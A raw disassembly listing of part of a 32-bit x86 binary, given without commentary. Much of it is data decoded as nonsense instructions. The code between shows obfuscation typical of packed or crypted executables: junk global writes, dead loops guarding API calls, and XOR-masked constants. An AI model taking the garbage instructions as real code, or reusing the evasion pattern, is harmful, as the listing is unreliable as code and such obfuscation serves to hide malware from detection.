  40e2bb:	inc    esi
  40e2bc:	(bad)  
  40e2bd:	leave  
  40e2be:	sar    edi,cl
  40e2c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2c1:	shl    al,1
  40e2c3:	inc    edi
  40e2c4:	ret    0xe4e5
  40e2c7:	sbb    eax,0xf5a8563b
  40e2cc:	push   0x2435e74d
  40e2d1:	ins    BYTE PTR es:[edi],dx
  40e2d2:	fdiv   DWORD PTR [edx]
  40e2d4:	xchg   DWORD PTR [edi],esi
  40e2d6:	pop    esp
  40e2d7:	sub    DWORD PTR [edi+0x35],edi
  40e2da:	pop    es
  40e2db:	jmp    0x15577c70
  40e2e0:	sub    dl,BYTE PTR [ecx-0x54]
  40e2e3:	mov    gs,WORD PTR [edi-0x8]
  40e2e6:	sub    al,0xe7
  40e2e8:	xchg   edi,eax
  40e2e9:	inc    edi
  40e2ea:	and    DWORD PTR [edx],edx
  40e2ec:	push   esp
  40e2ed:	repnz adc eax,0x8b39dfd6
  40e2f3:	fwait
  40e2f4:	imul   edi,DWORD PTR fs:[ecx],0x3f7bf6f8
  40e2fb:	fstp   DWORD PTR [edi]
  40e2fd:	call   0xc32d530f
  40e302:	out    0x41,eax
  40e304:	(bad)  
  40e305:	adc    al,0xd4
  40e307:	lds    edi,FWORD PTR [ecx+0x6bfb916f]
  40e30d:	idiv   BYTE PTR [edi+ecx*1-0x19]
  40e311:	adc    edx,ebx
  40e313:	or     al,BYTE PTR [edi]
  40e315:	out    dx,eax
  40e316:	ins    BYTE PTR es:[edi],dx
  40e317:	sahf   
  40e318:	mov    cl,0x56
  40e31a:	mov    esi,0x8c0f0ca8
  40e31f:	mov    dl,0x3
  40e321:	test   DWORD PTR [eax-0x65fd5778],0xc10f6f25
  40e32b:	push   0xffffff93
  40e32d:	push   ds
  40e32e:	mov    ds:0x63e554b8,al
  40e333:	dec    ebx
  40e334:	xor    edx,edx
  40e336:	add    DWORD PTR [ebp-0xc],ebx
  40e339:	pop    ebx
  40e33a:	mov    eax,DWORD PTR [ebp-0xc]
  40e33d:	pop    edi
  40e33e:	pop    esi
  40e33f:	pop    ebx
  40e340:	leave  
  40e341:	ret    0x10
  40e344:	push   ebp
  40e345:	mov    ebp,esp
  40e347:	push   ecx
  40e348:	mov    DWORD PTR ds:0x433717,0x77e5
  40e352:	push   ecx
  40e353:	mov    DWORD PTR ds:0x433827,0xd96
  40e35d:	mov    eax,0xf89c8532
  40e362:	mov    DWORD PTR ds:0x4337eb,0x6f59
  40e36c:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40e373:	push   esi
  40e374:	movzx  ecx,WORD PTR ds:0x43376b
  40e37b:	mov    DWORD PTR [ebp-0x8],eax
  40e37e:	mov    ecx,DWORD PTR [ebp+0x8]
  40e381:	mov    DWORD PTR ds:0x4337bb,0x659
  40e38b:	push   edi
  40e38c:	mov    edi,0x7510854
  40e391:	not    esi
  40e393:	mov    esi,0x32729b
  40e398:	mov    DWORD PTR ds:0x433767,0x4cec
  40e3a2:	cmp    ecx,eax
  40e3a4:	mov    DWORD PTR ds:0x4337af,0x27d6
  40e3ae:	jmp    0x40e4db
  40e3b3:	cs jecxz 0x40e357
  40e3b6:	add    eax,0xf1aa4571
  40e3bb:	push   0x47
  40e3bd:	popf   
  40e3be:	call   DWORD PTR [ecx]
  40e3c0:	addr16 jb 0x40e395
  40e3c3:	aas    
  40e3c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c5:	jle    0x40e445
  40e3c7:	push   cs
  40e3c8:	jg     0x40e448
  40e3ca:	jle    0x40e3db
  40e3cc:	fdivr  DWORD PTR [eax]
  40e3ce:	pop    es
  40e3cf:	pop    edi
  40e3d0:	push   ss
  40e3d1:	(bad)  
  40e3d3:	fisubr WORD PTR [edi-0x3b]
  40e3d6:	sbb    ebx,ebx
  40e3d8:	mov    ah,dl
  40e3da:	xchg   esi,eax
  40e3db:	fwait
  40e3dc:	out    0x79,al
  40e3de:	aas    
  40e3df:	int3   
  40e3e0:	cmc    
  40e3e1:	cmp    eax,0xcafbadc0
  40e3e6:	imul   ebp,DWORD PTR [eax+0x33],0x6d6814e5
  40e3ed:	lods   eax,DWORD PTR ds:[esi]
  40e3ee:	jmp    0xd3a285bc
  40e3f3:	and    ecx,DWORD PTR [esi]
  40e3f5:	repz mov ch,0x79
  40e3f8:	stos   BYTE PTR es:[edi],al
  40e3f9:	jns    0x40e428
  40e3fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3fc:	call   esi
  40e3fe:	sub    eax,DWORD PTR [edx+0x42d5e2e7]
  40e404:	cmp    ch,bl
  40e406:	xchg   ebp,eax
  40e407:	clc    
  40e408:	sub    DWORD PTR [ebp+0x59],edx
  40e40b:	cmp    bh,BYTE PTR [eax]
  40e40d:	mov    DWORD PTR [esi],0x204c3eba
  40e413:	mov    ds:0x52ff7a2f,eax
  40e418:	pop    ss
  40e419:	and    al,0x75
  40e41b:	fcomp  DWORD PTR [eax-0x7ea7dae8]
  40e421:	mov    edx,0x1e39699a
  40e426:	shl    ebx,1
  40e428:	or     BYTE PTR [edx+0x31637065],bl
  40e42e:	test   eax,0x841c4c3d
  40e433:	jae    0x40e3d6
  40e435:	sbb    DWORD PTR [ebp+0x798410cc],ebp
  40e43b:	ins    DWORD PTR es:[edi],dx
  40e43c:	test   eax,0x759f5438
  40e441:	jmp    0xbe4ac981
  40e446:	mov    ah,0xf5
  40e448:	mov    ch,0xa3
  40e44a:	dec    ebx
  40e44b:	into   
  40e44c:	add    dl,BYTE PTR [eax]
  40e44e:	call   0x5bbf6d2f
  40e453:	inc    ebp
  40e454:	xchg   cx,ax
  40e456:	popf   
  40e457:	mov    WORD PTR [ebp-0x307d1909],ds
  40e45d:	in     eax,dx
  40e45e:	and    cl,dh
  40e460:	inc    esp
  40e461:	push   ss
  40e462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e463:	jge    0x40e403
  40e465:	sub    BYTE PTR [esi-0x6e],ah
  40e468:	ret    0x6411
  40e46b:	mov    DWORD PTR [eax+0x62],ecx
  40e46e:	push   es
  40e46f:	xor    al,0xc5
  40e471:	dec    esi
  40e472:	movd   DWORD PTR [eax],mm0
  40e475:	rol    al,1
  40e477:	dec    ecx
  40e478:	or     DWORD PTR [eax+0x3e],eax
  40e47b:	add    DWORD PTR [edi+0x325a3e84],ebx
  40e481:	adc    al,0xe3
  40e484:	(bad)  
  40e485:	aad    0xed
  40e487:	shl    BYTE PTR [ebx+0x22d549d6],cl
  40e48d:	in     al,0x29
  40e48f:	loope  0x40e415
  40e491:	out    0xca,eax
  40e493:	test   al,0x12
  40e495:	push   eax
  40e496:	cdq    
  40e497:	cmp    al,0xae
  40e499:	imul   DWORD PTR [edi]
  40e49b:	push   esi
  40e49c:	lea    eax,[ebx]
  40e49e:	push   ecx
  40e49f:	add    cl,BYTE PTR [ecx+ebx*8]
  40e4a2:	(bad)  
  40e4a3:	mov    ds:0x885122a,al
  40e4a8:	and    BYTE PTR [ebx+0x4],ch
  40e4ab:	in     al,0x9f
  40e4ad:	or     DWORD PTR [ebp-0x6752383a],ecx
  40e4b3:	pop    ss
  40e4b4:	(bad)  
  40e4b5:	fs or  al,0x23
  40e4b8:	in     eax,dx
  40e4b9:	dec    eax
  40e4ba:	push   ecx
  40e4bb:	xchg   esi,eax
  40e4bc:	inc    ebp
  40e4bd:	addr16 and al,0xf5
  40e4c0:	cwde   
  40e4c1:	inc    esi
  40e4c2:	pop    ecx
  40e4c3:	in     eax,0x53
  40e4c5:	int3   
  40e4c6:	xor    DWORD PTR [edi+0x6],esi
  40e4c9:	lock xchg edx,eax
  40e4cb:	mov    dl,0x1a
  40e4cd:	sbb    DWORD PTR [eax],ebx
  40e4cf:	ins    DWORD PTR es:[edi],dx
  40e4d0:	fwait
  40e4d1:	cdq    
  40e4d2:	(bad)  
  40e4d3:	cmc    
  40e4d4:	lock jne 0x40e50c
  40e4d7:	sbb    al,0x7f
  40e4d9:	cmc    
  40e4da:	fisttp QWORD PTR [edi]
  40e4dc:	test   dl,bh
  40e4de:	add    DWORD PTR [eax],eax
  40e4e0:	add    BYTE PTR [ecx+0x43383305],al
  40e4e6:	add    BYTE PTR [ebp-0x74ffffce],bh
  40e4ec:	inc    ebp
  40e4ed:	cld    
  40e4ee:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4f1:	xor    DWORD PTR ds:0x433717,0x4337bf
  40e4fb:	xor    eax,edi
  40e4fd:	add    eax,esi
  40e4ff:	cmp    eax,ecx
  40e501:	mov    DWORD PTR ds:0x433833,0x147f
  40e50b:	je     0x40e6db
  40e511:	and    DWORD PTR ds:0x4337a7,0x0
  40e51b:	jmp    0x40e52b
  40e520:	mov    eax,ds:0x4337a7
  40e525:	inc    eax
  40e526:	mov    ds:0x4337a7,eax
  40e52b:	cmp    DWORD PTR ds:0x4337a7,0x13
  40e532:	jae    0x40e568
  40e538:	cmp    DWORD PTR ds:0x4337a7,0x9
  40e53f:	jne    0x40e54b
  40e545:	call   DWORD PTR ds:0x412030
  40e54b:	cmp    DWORD PTR ds:0x4337a7,0x8
  40e552:	jne    0x40e563
  40e558:	mov    eax,ds:0x4337a7
  40e55d:	inc    eax
  40e55e:	mov    ds:0x4337a7,eax
  40e563:	jmp    0x40e520
  40e568:	mov    eax,DWORD PTR [ebp-0x4]
  40e56b:	sub    edx,DWORD PTR ds:0x4337bb
  40e571:	xor    eax,edi
  40e573:	dec    edx
  40e574:	add    eax,esi
  40e576:	push   eax
  40e577:	adc    DWORD PTR ds:0x4337b3,0x52cc
  40e581:	push   DWORD PTR [ebp-0x8]
  40e584:	or     DWORD PTR ds:0x43377b,edx
  40e58a:	push   DWORD PTR [ebp-0x4]
  40e58d:	mov    edx,DWORD PTR ds:0x413bde
  40e593:	call   0x406864
  40e598:	mov    ecx,DWORD PTR ds:0x413bde
  40e59e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e5a4:	mov    DWORD PTR [ecx],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a9:	jmp    0x40e840
  40e5ae:	jmp    0x40e6db
  40e5b3:	xor    dl,BYTE PTR [ebp-0x2e]
  40e5b6:	fs jno 0x40e61a
  40e5b9:	mov    al,0x51
  40e5bb:	sti    
  40e5bc:	adc    eax,0x7c019328
  40e5c1:	cmc    
  40e5c2:	mov    esi,0x7e7ea5cf
  40e5c7:	push   cs
  40e5c8:	jg     0x40e648
  40e5ca:	jle    0x40e58c
  40e5cc:	adc    dh,cl
  40e5ce:	shl    DWORD PTR [esi-0x7c],1
  40e5d1:	xchg   edi,eax
  40e5d2:	cmp    BYTE PTR [eax-0x7],ch
  40e5d5:	sbb    ch,bl
  40e5d7:	lods   al,BYTE PTR ds:[esi]
  40e5d8:	inc    edx
  40e5d9:	call   DWORD PTR [esi+0x7e1d0422]
  40e5df:	adc    DWORD PTR [esi-0x58],edi
  40e5e2:	adc    esp,DWORD PTR [ebp+0x77]
  40e5e5:	mov    ds:0x45f3061c,eax
  40e5ea:	fist   WORD PTR [edx+edi*8]
  40e5ed:	dec    ecx
  40e5ee:	cmp    al,BYTE PTR [ebx]
  40e5f0:	loope  0x40e61c
  40e5f2:	and    DWORD PTR [eax],esp
  40e5f4:	cmp    BYTE PTR [ebx],al
  40e5f6:	dec    edi
  40e5f7:	repnz mov dl,0xdf
  40e5fa:	in     al,dx
  40e5fb:	mov    bh,0x71
  40e5fd:	arpl   WORD PTR [edx-0x515cc37e],bp
  40e603:	sbb    al,0x1
  40e605:	xchg   edi,eax
  40e606:	fs out 0x5,eax
  40e609:	jmp    0x40e5fe
  40e60b:	fwait
  40e60c:	adc    esi,DWORD PTR [ebp+0xac2cef2]
  40e612:	fstp   TBYTE PTR es:[ecx+0x250a537e]
  40e619:	ds aad 0xf1
  40e61c:	inc    BYTE PTR [ebp-0x152d3f3c]
  40e622:	cmp    eax,0x1946d12c
  40e627:	in     eax,dx
  40e628:	sub    ch,bl
  40e62a:	ss or  eax,0xa0bd1c5c
  40e630:	mov    edx,0xb240b7bd
  40e635:	outs   dx,DWORD PTR ds:[esi]
  40e636:	adc    BYTE PTR [esi+0x44],dl
  40e639:	pop    eax
  40e63a:	cmp    al,0x2d
  40e63c:	outs   dx,BYTE PTR ds:[esi]
  40e63d:	jl     0x40e63f
  40e63f:	out    dx,eax
  40e640:	dec    edi
  40e641:	mov    bl,0xb8
  40e643:	mov    BYTE PTR [esi],dh
  40e645:	push   0x5a
  40e647:	fild   WORD PTR [edx-0x16]
  40e64a:	sbb    dh,BYTE PTR [edx+0x4d]
  40e64d:	add    al,0xf1
  40e64f:	sti    
  40e650:	(bad)  [ebp+0x6c]
  40e653:	or     ebx,DWORD PTR [edx+esi*1-0x30]
  40e657:	adc    ch,BYTE PTR [ebx]
  40e659:	push   ss
  40e65a:	imul   edi,DWORD PTR [ecx-0x24],0xfdd91eb7
  40e661:	jecxz  0x40e67c
  40e663:	out    0xcf,al
  40e665:	xor    al,0x10
  40e667:	inc    esp
  40e668:	push   ds
  40e669:	adc    BYTE PTR [ebp-0x5956eaea],bl
  40e66f:	test   al,0x25
  40e671:	loop   0x40e639
  40e673:	mov    esp,0xf6944cda
  40e678:	mov    esp,0xe8c95052
  40e67d:	lods   eax,DWORD PTR ds:[esi]
  40e67e:	iret   
  40e67f:	sahf   
  40e680:	outs   dx,BYTE PTR ds:[esi]
  40e681:	jg     0x40e693
  40e683:	adc    al,0x95
  40e685:	lahf   
  40e686:	and    eax,0x85ab7dfa
  40e68b:	rol    BYTE PTR [edi],1
  40e68d:	imul   ebp,DWORD PTR [edx-0x4438b5b6],0xf
  40e694:	xor    dl,BYTE PTR [edx]
  40e696:	inc    ebx
  40e697:	(bad)  
  40e699:	or     al,0xaa
  40e69b:	push   ebp
  40e69c:	mov    eax,ds:0x86aebe2
  40e6a1:	inc    ecx
  40e6a2:	mov    ds:0x5cf36bd2,eax
  40e6a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6a8:	xchg   ebp,eax
  40e6a9:	ins    DWORD PTR es:[edi],dx
  40e6aa:	in     al,0x79
  40e6ac:	test   DWORD PTR [esi-0x4],esi
  40e6af:	push   eax
  40e6b0:	push   ebp
  40e6b1:	mov    ecx,0x29a77521
  40e6b6:	int3   
  40e6b7:	mov    ds:0xc75a9d08,eax
  40e6bc:	pop    eax
  40e6bd:	in     eax,dx
  40e6be:	leave  
  40e6bf:	push   0xfffffff2
  40e6c1:	neg    DWORD PTR [eiz*4-0x3ed76a5a]
  40e6c8:	cwde   
  40e6c9:	mov    ah,0xb4
  40e6cb:	or     al,0x63
  40e6cd:	lock or al,0x79
  40e6d0:	inc    ecx
  40e6d1:	mov    esi,edi
  40e6d3:	add    eax,0x93013ad7
  40e6d8:	push   edi
  40e6d9:	sub    eax,0xfc458bbb
  40e6de:	mov    ecx,DWORD PTR [ebp+0x10]
  40e6e1:	xor    eax,edi
  40e6e3:	add    eax,esi
  40e6e5:	cmp    eax,ecx
  40e6e7:	jne    0x40e83d
  40e6ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e6f0:	xor    eax,edi
  40e6f2:	add    eax,esi
  40e6f4:	jmp    0x40e821
  40e6f9:	xor    BYTE PTR [ebx+0x7369636a],al
  40e6ff:	xor    DWORD PTR [ecx+0x23],edx
  40e702:	mov    ebp,0x528f30a1
  40e707:	mov    eax,ds:0x7ea2df31
  40e70c:	jle    0x40e71c
  40e70e:	jg     0x40e78e
  40e710:	jle    0x40e71a
  40e712:	icebp  
  40e713:	cs inc esi
  40e715:	sbb    bl,dl
  40e717:	cli    
  40e718:	test   BYTE PTR [ebx-0x5b],cl
  40e71b:	cli    
  40e71c:	jecxz  0x40e767
  40e71e:	out    dx,eax
  40e71f:	push   esp
  40e720:	mov    ecx,0xe77b63ef
  40e725:	int    0x50
  40e727:	std    
  40e728:	jns    0x40e6b6
  40e72a:	lsl    ebx,WORD PTR [ebp+ebx*4-0x41986a62]
  40e732:	inc    ebx
  40e733:	jp     0x40e71d
  40e735:	mov    ds:0xf535d927,al
  40e73a:	fucomi st,st(3)
  40e73c:	mov    esi,0x20ae34dd
  40e741:	mov    bh,0x85
  40e743:	mov    DWORD PTR ds:0xc719e90a,esi
  40e749:	fst    DWORD PTR [edi-0xf7d9454]
  40e74f:	pusha  
  40e750:	outs   dx,BYTE PTR ds:[esi]
  40e751:	call   0x9a29:0xa15e8ab5
  40e758:	xor    DWORD PTR [ebx-0x6621032b],0xbae1b007
  40e762:	xchg   DWORD PTR [ecx],ebp
  40e764:	jp     0x40e6fa
  40e766:	outs   dx,BYTE PTR ds:[esi]
  40e767:	mov    dl,0xc4
  40e769:	retf   
  40e76a:	ffreep st(2)
  40e76c:	fild   DWORD PTR [esi-0x48]
  40e76f:	loope  0x40e7b7
  40e771:	jne    0x40e76b
  40e773:	mov    edx,0xaa53e3e7
  40e778:	aaa    
  40e779:	jne    0x40e712
  40e77b:	pop    edi
  40e77c:	fwait
  40e77d:	dec    eax
  40e77e:	xor    ebx,eax
  40e780:	ret    
  40e781:	inc    ebx
  40e782:	cmp    BYTE PTR [ecx-0x13],0x2
  40e786:	adc    DWORD PTR [ebp-0x67e3a3b8],ebx
  40e78c:	dec    eax
  40e78d:	sbb    al,0xbc
  40e78f:	add    esi,esp
  40e791:	inc    eax
  40e792:	scas   al,BYTE PTR es:[edi]
  40e793:	out    dx,al
  40e794:	call   0x562c:0xcdb5622b
  40e79b:	scas   eax,DWORD PTR es:[edi]
  40e79c:	push   edx
  40e79d:	push   0x3d32d3f8
  40e7a2:	xchg   edi,edi
  40e7a4:	jmp    0xffb5:0x7cefdd63
  40e7ab:	pop    esp
  40e7ac:	xchg   ecx,eax
  40e7ad:	sar    BYTE PTR [eax+0x8],1
  40e7b0:	inc    edx
  40e7b1:	mov    ecx,edx
  40e7b3:	mov    BYTE PTR ds:0x8e641e43,dl
  40e7b9:	inc    esi
  40e7ba:	xchg   ecx,eax
  40e7bb:	pushf  
  40e7bc:	sbb    BYTE PTR [ecx+0x33a05442],ah
  40e7c2:	fild   WORD PTR [esi+0x127f6aa8]
  40e7c8:	xor    al,0x67
  40e7ca:	(bad)  
  40e7cb:	and    DWORD PTR [bx+di-0x6118],edi
  40e7d0:	lods   al,BYTE PTR ds:[esi]
  40e7d1:	ss je  0x40e787
  40e7d4:	enter  0xa811,0x63
  40e7d8:	adc    al,0xee
  40e7da:	out    dx,al
  40e7db:	inc    esp
  40e7dc:	cdq    
  40e7dd:	mov    ebp,0xa6e97e64
  40e7e2:	js     0x40e7cb
  40e7e4:	push   0x61954eac
  40e7e9:	xor    bl,BYTE PTR [esi]
  40e7eb:	aam    0xf
  40e7ed:	or     eax,0x1d002e57
  40e7f2:	lar    ebp,WORD PTR [esp+ecx*1-0x12962ca7]
  40e7fa:	sub    DWORD PTR [ecx],eax
  40e7fc:	adc    al,0xdd
  40e7fe:	arpl   bx,sp
  40e800:	rol    ah,0x43
  40e803:	mov    esi,0x6fd41195
  40e808:	mov    esi,0x47b505e1
  40e80d:	rcr    BYTE PTR [eax-0x34],cl
  40e810:	mov    eax,0x25c0422e
  40e815:	test   al,0x27
  40e817:	stc    
  40e818:	and    cl,BYTE PTR [edx-0x3e]
  40e81b:	ficomp DWORD PTR [ebp+0x27bb888d]
  40e821:	mov    ds:0x413c62,eax
  40e826:	mov    eax,DWORD PTR [ebp-0x4]
  40e829:	xor    eax,edi
  40e82b:	add    eax,esi
  40e82d:	mov    ds:0x413c5a,eax
  40e832:	push   DWORD PTR [ebp-0x8]
  40e835:	push   DWORD PTR [ebp-0x4]
  40e838:	call   0x40e84a
  40e83d:	mov    eax,DWORD PTR [ebp-0x4]
  40e840:	xor    eax,edi
  40e842:	pop    edi
  40e843:	add    eax,esi
  40e845:	pop    esi
  40e846:	leave  
  40e847:	ret    0xc
  40e84a:	push   ebp
  40e84b:	mov    ebp,esp
  40e84d:	sub    esp,0x60
  40e850:	mov    eax,DWORD PTR [ebp+0x8]
  40e853:	push   ebx
  40e854:	and    DWORD PTR ds:0x43383f,0x0
  40e85e:	jmp    0x40e870
  40e863:	mov    ebx,DWORD PTR ds:0x43383f
  40e869:	inc    ebx
  40e86a:	mov    DWORD PTR ds:0x43383f,ebx
  40e870:	cmp    DWORD PTR ds:0x43383f,0x19
  40e877:	jae    0x40e8a2
  40e87d:	cmp    DWORD PTR ds:0x43383f,0x1e
  40e884:	jne    0x40e893
  40e88a:	push   DWORD PTR [ebp-0x14]
  40e88d:	call   DWORD PTR ds:0x412034
  40e893:	jmp    0x40e863
  40e898:	sub    DWORD PTR ds:0x4337bf,0x283f
  40e8a2:	push   esi
  40e8a3:	and    DWORD PTR ds:0x4337ff,0x0
  40e8ad:	mov    esi,DWORD PTR ds:0x4337ff
  40e8b3:	inc    esi
  40e8b4:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ba:	cmp    DWORD PTR ds:0x4337ff,0x10
  40e8c1:	jne    0x40e8d5
  40e8c7:	push   0x43377f
  40e8cc:	push   DWORD PTR [ebp-0x28]
  40e8cf:	call   DWORD PTR ds:0x4123ac
  40e8d5:	cmp    DWORD PTR ds:0x4337ff,0xf
  40e8dc:	jne    0x40e8ef
  40e8e2:	mov    esi,DWORD PTR ds:0x4337ff
  40e8e8:	inc    esi
  40e8e9:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ef:	cmp    DWORD PTR ds:0x4337ff,0x1a
  40e8f6:	jb     0x40e8ad
  40e8fc:	mov    DWORD PTR ds:0x4337f7,0x1e
  40e906:	cmp    DWORD PTR ds:0x4337f7,0x0
  40e90d:	je     0x40e960
  40e913:	cmp    DWORD PTR ds:0x4337f7,0xc
  40e91a:	jne    0x40e933
  40e920:	push   0x6d58
  40e925:	push   DWORD PTR [ebp-0x20]
  40e928:	push   0x30b0
  40e92d:	call   DWORD PTR ds:0x4121e0
  40e933:	cmp    DWORD PTR ds:0x4337f7,0xd
  40e93a:	jne    0x40e94d
  40e940:	mov    ebx,DWORD PTR ds:0x4337f7
  40e946:	dec    ebx
  40e947:	mov    DWORD PTR ds:0x4337f7,ebx
  40e94d:	mov    ebx,DWORD PTR ds:0x4337f7
  40e953:	dec    ebx
  40e954:	mov    DWORD PTR ds:0x4337f7,ebx
  40e95a:	jmp    0x40e906
  40e95f:	dec    esi
  40e960:	mov    esi,0x7510854
  40e965:	xor    eax,esi
  40e967:	mov    ebx,0x32729b
  40e96c:	add    eax,ebx
  40e96e:	and    DWORD PTR ds:0x4337a7,0x3e06
  40e978:	push   edi
  40e979:	neg    DWORD PTR ds:0x43372b
  40e97f:	mov    DWORD PTR [ebp-0x18],eax
  40e982:	and    DWORD PTR ds:0x43371b,0x0
  40e98c:	mov    edi,DWORD PTR ds:0x43371b
  40e992:	inc    edi
  40e993:	mov    DWORD PTR ds:0x43371b,edi
  40e999:	cmp    DWORD PTR ds:0x43371b,0x21
  40e9a0:	jne    0x40e9b4
  40e9a6:	push   DWORD PTR [ebp-0x1c]
  40e9a9:	push   0x4337bb
  40e9ae:	call   DWORD PTR ds:0x4121e4
  40e9b4:	cmp    DWORD PTR ds:0x43371b,0x12
  40e9bb:	jb     0x40e98c
  40e9c1:	sbb    DWORD PTR ds:0x43371b,edx
  40e9c7:	mov    edi,DWORD PTR [ebp+0x8]
  40e9ca:	xor    edi,esi
  40e9cc:	and    DWORD PTR ds:0x43376b,0x43370f
  40e9d6:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e9dd:	adc    DWORD PTR ds:0x433837,0x4337bf
  40e9e7:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e9ee:	sub    DWORD PTR ds:0x43377f,0x4337bb
  40e9f8:	add    edi,ebx
  40e9fa:	mov    DWORD PTR ds:0x4337ab,0x5e0d
  40ea04:	jmp    0x40f1b9
  40ea09:	cmp    edi,0x40
  40ea0c:	jne    0x40ec91
  40ea12:	movzx  eax,BYTE PTR ds:0x43371f
  40ea19:	mov    eax,ds:0x413a5e
  40ea1e:	jmp    0x40ec4b
  40ea23:	xchg   BYTE PTR [edi],dh
  40ea25:	inc    ebx
  40ea26:	(bad)  
  40ea27:	jae    0x40ea94
  40ea29:	push   edx
  40ea2a:	aaa    
  40ea2b:	mov    ds:0xca103a68,al
  40ea30:	and    al,0x61
  40ea32:	(bad)  
  40ea33:	out    dx,eax
  40ea34:	mov    ds:0x7c0e7e7e,eax
  40ea39:	jle    0x40eab9
  40ea3b:	cld    
  40ea3c:	mov    WORD PTR [edi],?
  40ea3e:	push   cs
  40ea3f:	sbb    bh,BYTE PTR [eax+0x5c]
  40ea42:	daa    
  40ea43:	dec    ecx
  40ea44:	repz sub al,0x89
  40ea47:	jl     0x40ea17
  40ea49:	cdq    
  40ea4a:	sbb    BYTE PTR [eax+0x65],bh
  40ea4d:	jl     0x40eab6
  40ea4f:	loop   0x40ea3c
  40ea51:	aam    0x9
  40ea53:	adc    ch,BYTE PTR [ebx+ebp*8+0x6b]
  40ea57:	sub    bh,BYTE PTR [ebp-0x2394c631]
  40ea5d:	in     eax,dx
  40ea5e:	inc    ebx
  40ea5f:	sbb    DWORD PTR [edx+esi*2],ebx
  40ea62:	jns    0x40ea7f
  40ea64:	cmc    
  40ea65:	cld    
  40ea66:	(bad)  [edi+eax*8]
  40ea69:	div    BYTE PTR [ebx]
  40ea6b:	mov    dh,0xaa
  40ea6d:	mov    DWORD PTR ds:0x2460f279,eax
  40ea73:	out    dx,al
  40ea74:	push   0xdf542580
  40ea79:	stc    
  40ea7a:	fwait
  40ea7b:	jo     0x40ea93
  40ea7d:	cli    
  40ea7e:	outs   dx,BYTE PTR ds:[esi]
  40ea7f:	pop    ebx
  40ea80:	mov    BYTE PTR ds:0xb249fb2f,ch
  40ea86:	inc    ecx
  40ea87:	pusha  
  40ea88:	cli    
  40ea89:	add    dl,BYTE PTR [ecx-0x74]
  40ea8c:	jne    0x40ea17
  40ea8e:	pop    ss
  40ea8f:	in     eax,dx
  40ea90:	or     ecx,DWORD PTR [esi]
  40ea92:	adc    esp,DWORD PTR [ebp+0x42058097]
  40ea98:	pop    edx
  40ea99:	(bad)  
  40ea9a:	cld    
  40ea9b:	cld    
  40ea9c:	mov    edi,DWORD PTR [esi-0x16]
  40ea9f:	shl    eax,1
  40eaa1:	xor    ah,BYTE PTR [edx]
  40eaa3:	push   cs
  40eaa4:	mov    esp,esp
  40eaa6:	aas    
  40eaa7:	retf   
  40eaa8:	inc    ebx
  40eaa9:	sbb    ch,BYTE PTR [esi]
  40eaab:	mov    esi,0x47bfefb2
  40eab0:	pop    ebp
  40eab1:	add    bl,bh
  40eab3:	lds    esp,FWORD PTR [esi]
  40eab5:	cwde   
  40eab6:	gs lock mov dl,0x41
  40eaba:	lea    eax,ds:0xf9caccda
  40eac0:	push   eax
  40eac1:	xchg   edx,eax
  40eac2:	cmp    BYTE PTR [ebp-0x26b27a97],al
  40eac8:	cdq    
  40eac9:	inc    esp
  40eaca:	cwde   
  40eacb:	mov    eax,ds:0x483c36eb
  40ead0:	pop    es
  40ead1:	mov    cl,0x23
  40ead3:	inc    esp
  40ead4:	dec    edi
  40ead5:	xor    edx,DWORD PTR [eax-0x7e]
  40ead8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ead9:	pop    esi
  40eada:	sar    BYTE PTR [ebp+0x614eb03f],cl
  40eae0:	sbb    al,0xc6
  40eae2:	mov    bh,0xea
  40eae4:	sbb    al,0xdc
  40eae6:	push   0x9
  40eae8:	inc    ecx
  40eae9:	into   
  40eaea:	mov    ah,0xf2
  40eaec:	add    eax,esi
  40eaee:	mov    edi,0x5cdeb5ca
  40eaf3:	ror    DWORD PTR fs:[ecx+ebx*2+0x4d],1
  40eaf8:	shl    DWORD PTR [ebp-0x24],1
  40eafb:	mov    eax,DWORD PTR [edx-0x397aea04]
  40eb01:	lahf   
  40eb02:	lahf   
  40eb03:	inc    ecx
  40eb04:	or     ebp,ebx
  40eb06:	sahf   
  40eb07:	sbb    BYTE PTR [ecx-0x5],ah
  40eb0a:	(bad)  
  40eb0c:	mov    ds:0x2d162c46,al
  40eb11:	push   es
  40eb12:	jmp    0xd94b:0x53c8ce7a
  40eb19:	sbb    ebx,eax
  40eb1b:	inc    esp
  40eb1c:	xchg   DWORD PTR [edx+0x734e7622],esi
  40eb22:	cmp    BYTE PTR [eax+0x53],ch
  40eb25:	das    
  40eb26:	dec    ebp
  40eb27:	repnz imul ebx,DWORD PTR [ebx-0x1d1548e4],0xffffffc3
  40eb2f:	mov    bh,0xe5
  40eb31:	test   DWORD PTR [eax],ebp
  40eb33:	dec    edx
  40eb34:	jl     0x40eacd
  40eb36:	stos   BYTE PTR es:[edi],al
  40eb37:	push   ebx
  40eb38:	push   esp
  40eb39:	push   ss
  40eb3a:	dec    ebp
  40eb3b:	js     0x40eb61
  40eb3d:	push   edx
  40eb3e:	xor    eax,0x7eb13ab0
  40eb43:	push   0x23328889
  40eb48:	push   edi
  40eb49:	loop   0x40eb98
  40eb4b:	fild   WORD PTR [ebp+0x45]
  40eb4e:	mov    al,ds:0x86d9a83e
  40eb53:	sub    al,0xe3
  40eb55:	add    ah,cl
  40eb57:	or     eax,DWORD PTR [edx+0x10]
  40eb5a:	xchg   BYTE PTR [esi],bh
  40eb5c:	fxch   st(4)
  40eb5e:	inc    ecx
  40eb5f:	stc    
  40eb60:	stc    
  40eb61:	outs   dx,DWORD PTR ds:[si]
  40eb63:	rcl    DWORD PTR [ebx-0x19],0xb1
  40eb67:	push   ecx
  40eb68:	nop
  40eb69:	or     DWORD PTR [edi+0x1a3951e2],eax
